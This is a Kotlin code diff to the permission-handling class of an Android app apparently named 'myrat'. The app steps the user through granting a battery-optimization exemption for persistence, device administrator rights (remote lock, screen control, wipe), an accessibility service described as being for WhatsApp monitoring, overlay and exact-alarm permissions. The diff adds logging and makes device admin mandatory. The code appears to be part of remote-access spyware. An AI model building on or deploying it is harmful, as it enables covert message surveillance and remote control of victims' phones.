@@ -331,38 +331,54 @@ class PermissionHandler(
             
             // Battery optimization (critical for service persistence)
             if (!isBatteryOptimizationDisabled(activity)) {
+                Logger.log("🔋 Battery optimization not disabled, requesting...")
                 requestBatteryOptimization(activity)
                 return
+            } else {
+                Logger.log("✅ Battery optimization already disabled")
             }
             
-            // Device admin (for lock service)
+            // Device admin (for lock service) - IMPROVED CHECK
             if (!isDeviceAdminEnabled(activity)) {
+                Logger.log("🔐 Device admin not enabled, requesting...")
                 requestDeviceAdmin(activity)
                 return
+            } else {
+                Logger.log("✅ Device admin already enabled")
             }
             
             // Accessibility service (for WhatsApp monitoring)
             if (!isAccessibilityServiceEnabled(activity)) {
+                Logger.log("♿ Accessibility service not enabled, requesting...")
                 requestAccessibilityService(activity)
                 return
+            } else {
+                Logger.log("✅ Accessibility service already enabled")
             }
             
             // System overlay
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity)) {
+                Logger.log("🖼️ Overlay permission not granted, requesting...")
                 requestOverlayPermission(activity)
                 return
+            } else {
+                Logger.log("✅ Overlay permission already granted or not needed")
             }
             
             // Exact alarms (Android 12+)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as? android.app.AlarmManager
                 if (alarmManager != null && !alarmManager.canScheduleExactAlarms()) {
+                    Logger.log("⏰ Exact alarms permission not granted, requesting...")
                     requestExactAlarms(activity)
                     return
+                } else {
+                    Logger.log("✅ Exact alarms permission already granted or not needed")
                 }
             }
             
             // All special permissions done, move to manufacturer settings
+            Logger.log("✅ All special permissions checked, moving to manufacturer settings")
             requestManufacturerSpecificSettings(activity)
             
         } catch (e: Exception) {
@@ -386,11 +402,8 @@ class PermissionHandler(
                     safeExecute {
                         serviceManager.checkAndStartAvailableServices()
                     }
-                    if (!isDeviceAdminEnabled(activity)) {
-                        requestDeviceAdmin(activity)
-                    } else {
-                        requestSpecialPermissions(activity)
-                    }
+                    // Continue to next special permission check
+                    requestSpecialPermissions(activity)
                 }
             }, SPECIAL_PERMISSION_DELAY)
             
@@ -408,11 +421,25 @@ class PermissionHandler(
         Logger.log("🔐 Requesting device admin (for lock service)")
         
         try {
+            // Double-check if device admin is actually enabled before requesting
+            if (isDeviceAdminEnabled(activity)) {
+                Logger.log("✅ Device admin is actually already enabled, skipping request")
+                handler.postDelayed({
+                    if (!isDestroyed) {
+                        safeExecute {
+                            serviceManager.checkAndStartAvailableServices()
+                        }
+                        requestSpecialPermissions(activity)
+                    }
+                }, 500)
+                return
+            }
+            
             val adminComponent = ComponentName(activity, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
             val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                 putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                 putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                    "Device Administrator permission enables remote device locking and security management.")
+                    "🔐 DEVICE ADMINISTRATOR PERMISSION\n\nThis permission enables:\n• Remote device locking\n• Screen control (on/off)\n• Security management\n• Device wipe (if needed)\n\nRequired for the Lock Service to function properly.")
             }
             activity.startActivity(intent)
             Logger.log("Device admin intent launched")
@@ -422,6 +449,7 @@ class PermissionHandler(
                     safeExecute {
                         serviceManager.checkAndStartAvailableServices()
                     }
+                    // Continue to next special permission check
                     requestSpecialPermissions(activity)
                 }
             }, SPECIAL_PERMISSION_DELAY)
@@ -663,6 +691,9 @@ class PermissionHandler(
                 Logger.log("Final service status: ${stats["running_services"]}/${stats["total_services"]} services running")
             }
             
+            // Log final permission status
+            logFinalPermissionStatus(activity)
+            
             isProcessing = false
             
         } catch (e: Exception) {
@@ -671,13 +702,38 @@ class PermissionHandler(
         }
     }
 
-    // Helper methods with crash protection
+    private fun logFinalPermissionStatus(activity: Activity) {
+        try {
+            Logger.log("=== FINAL PERMISSION STATUS ===")
+            Logger.log("🔋 Battery Optimization: ${if (isBatteryOptimizationDisabled(activity)) "✅ DISABLED" else "❌ ENABLED"}")
+            Logger.log("🔐 Device Admin: ${if (isDeviceAdminEnabled(activity)) "✅ ENABLED" else "❌ DISABLED"}")
+            Logger.log("♿ Accessibility Service: ${if (isAccessibilityServiceEnabled(activity)) "✅ ENABLED" else "❌ DISABLED"}")
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                Logger.log("🖼️ Overlay Permission: ${if (Settings.canDrawOverlays(activity)) "✅ GRANTED" else "❌ DENIED"}")
+            }
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as? android.app.AlarmManager
+                Logger.log("⏰ Exact Alarms: ${if (alarmManager?.canScheduleExactAlarms() == true) "✅ GRANTED" else "❌ DENIED"}")
+            }
+            
+            Logger.log("=== END PERMISSION STATUS ===")
+        } catch (e: Exception) {
+            Logger.error("Error logging final permission status", e)
+        }
+    }
+
+    // IMPROVED Helper methods with better error handling and logging
     private fun isBatteryOptimizationDisabled(context: Context): Boolean {
         return try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
-                powerManager?.isIgnoringBatteryOptimizations(context.packageName) ?: false
+                val result = powerManager?.isIgnoringBatteryOptimizations(context.packageName) ?: false
+                Logger.log("🔋 Battery optimization check: $result")
+                result
             } else {
+                Logger.log("🔋 Battery optimization not applicable for Android < M")
                 true
             }
         } catch (e: Exception) {
@@ -689,8 +745,25 @@ class PermissionHandler(
     private fun isDeviceAdminEnabled(context: Context): Boolean {
         return try {
             val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
+            if (devicePolicyManager == null) {
+                Logger.error("🔐 DevicePolicyManager is null")
+                return false
+            }
+            
             val adminComponent = ComponentName(context, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
-            devicePolicyManager?.isAdminActive(adminComponent) ?: false
+            val result = devicePolicyManager.isAdminActive(adminComponent)
+            Logger.log("🔐 Device admin check: $result (component: ${adminComponent.className})")
+            
+            // Additional verification - check if the component is properly registered
+            try {
+                val packageManager = context.packageManager
+                val receiverInfo = packageManager.getReceiverInfo(adminComponent, PackageManager.GET_META_DATA)
+                Logger.log("🔐 Device admin receiver found: ${receiverInfo.name}")
+            } catch (e: Exception) {
+                Logger.error("🔐 Device admin receiver not found or not properly registered", e)
+            }
+            
+            result
         } catch (e: Exception) {
             Logger.error("Error checking device admin", e)
             false
@@ -703,13 +776,21 @@ class PermissionHandler(
                 context.contentResolver,
                 Settings.Secure.ACCESSIBILITY_ENABLED, 0
             )
+            Logger.log("♿ Accessibility enabled setting: $accessibilityEnabled")
+            
             if (accessibilityEnabled == 1) {
                 val services = Settings.Secure.getString(
                     context.contentResolver,
                     Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                 )
-                services?.contains("${context.packageName}/com.myrat.app.service.WhatsAppService") == true
+                Logger.log("♿ Enabled accessibility services: $services")
+                
+                val serviceName = "${context.packageName}/com.myrat.app.service.WhatsAppService"
+                val result = services?.contains(serviceName) == true
+                Logger.log("♿ Our accessibility service enabled: $result (looking for: $serviceName)")
+                result
             } else {
+                Logger.log("♿ Accessibility services globally disabled")
                 false
             }
         } catch (e: Exception) {
@@ -751,8 +832,11 @@ class PermissionHandler(
                 true
             }
             val batteryOptimized = isBatteryOptimizationDisabled(activity)
+            val deviceAdminEnabled = isDeviceAdminEnabled(activity)
             
-            runtimeGranted && batteryOptimized
+            Logger.log("🔍 Permission check: Runtime=$runtimeGranted, Battery=$batteryOptimized, DeviceAdmin=$deviceAdminEnabled")
+            
+            runtimeGranted && batteryOptimized && deviceAdminEnabled
         } catch (e: Exception) {
             Logger.error("Error checking all permissions", e)
             false
@@ -768,14 +852,21 @@ class PermissionHandler(
                 return
             }
             
+            Logger.log("🔄 Handling resume - checking permissions and starting services")
+            
             // Always check and start available services on resume
             safeExecute {
                 serviceManager.checkAndStartAvailableServices()
             }
             
+            // Log current permission status
+            logFinalPermissionStatus(activity)
+            
             if (areAllPermissionsGranted()) {
-                Logger.log("All permissions granted on resume")
+                Logger.log("✅ All permissions granted on resume")
                 finishPermissionFlow(activity)
+            } else {
+                Logger.log("⚠️ Not all permissions granted on resume")
             }
         } catch (e: Exception) {
             Logger.error("Error in handleResume", e)
